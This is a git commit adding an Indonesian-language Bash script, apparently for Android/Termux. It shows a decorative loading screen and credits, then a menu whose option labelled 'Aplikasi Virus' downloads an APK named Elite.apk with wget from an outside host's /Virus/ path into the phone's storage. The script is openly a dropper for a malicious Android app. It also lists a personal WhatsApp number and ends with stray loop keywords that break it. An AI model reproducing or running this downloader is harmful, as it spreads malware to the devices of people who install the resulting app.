b0d29d6fa967b50ba815bf5c8ef8bf5a93f4677e
TuAn. 0w <46281175+TuAn0w@users.noreply.github.com>
2019-02-11 10:41:30 +0700

    Add files via upload

---
+++ moon.sh
@@ -0,0 +1,83 @@
+#!/bin/bash
+#version 1.0
+
+clear
+green="\033[32;1m"
+yellow="\033[33;1m"
+indigo="\033[34;1m"
+red="\033[35;1m"
+purple="\033[37;1m"
+cyan="\033[36;1m"
+white="\033[39;1m"
+clear
+
+echo " "
+echo " "
+cd /storage/emulated/0/Virus
+echo " "
+echo " "
+echo " "
+echo $indigo"Sedang Loading.........."
+sleep 1
+echo $yellow"□□□□□0%        | /////////        //////         ///// "
+sleep 1
+echo $yellow"■□□□□20%       |    //    //  // //  // /////   // // //    //"
+sleep 1
+echo $yellow"■■□□□40%       |   //    //  // ////// // //   // // // // //"
+sleep 1
+echo $yellow"■■■□□60%       |  //    ////// //  // // // @ ///// ////////"
+sleep 1
+echo $yellow"■■■■□80%       |==========================================="
+sleep 1
+echo $green"■■■■■100%      || Hidup Itu Butuh Proses||Jika Mau Sukses |"
+sleep 1
+echo $indigo"selesai...     |==========================================="
+sleep 3
+echo $white"Spesial Thanks : -Deniiganz || -ℳỖβℳ•Mr.∆stra96•"
+sleep 2
+echo $red"〓〓〓〓〓〓〓〓〓〓Selamat Datang〓〓〓〓〓〓〓〓〓〓"
+echo $yellow"█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█"
+echo $yellow"█                   ŴΔŘŇIŇG !!!                      █"
+echo $yellow"█ -Jɑngɑn di gunɑkɑn berlebihɑn                      █"
+echo $yellow"█ -Jikɑ udɑh downloɑd cɑri di penyimpɑnɑn berkɑs     █"
+echo $yellow"█ -Jika masih bingung Chat aja NO.Whatsaap di bawah  █"
+echo $yellow"█ -NO : 081335497168                                 █"
+echo $yellow"█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█"
+sleep 4
+###################################################
+# CTRL + C
+###################################################
+trap ctrl_c INT
+ctrl_c() {
+clear
+clear
+echo "Autor : Created : TuAn.0w" | lolcat
+figlet -f slant "!!!" | lolcat
+echo '[!] Maaf jika ada kesalahan!!!' | lolcat
+exit
+}
+echo $cyan"======================================================"
+echo "(1) Aplikasi Virus" | lolcat
+echo "(0) Exit" | lolcat
+echo $cyan"======================================================"
+echo $green "Silahkan pilih nomor 1 "
+read -p "[×]=[]=====> " pil;
+
+case $pil in
+
+0) echo $green"menunggu..."
+sleep 3
+echo $red'[!] Terima kasih sudah berkunjung !!!'
+sleep 1
+echo $red'[!] semoga bermanfaat !!!'
+exit
+;;
+
+1) wget http://gogr4m.tk/Virus/Elite.apk
+echo " [!] Download Success........" | lolcat
+exit
+;;
+
+esac
+done
+done
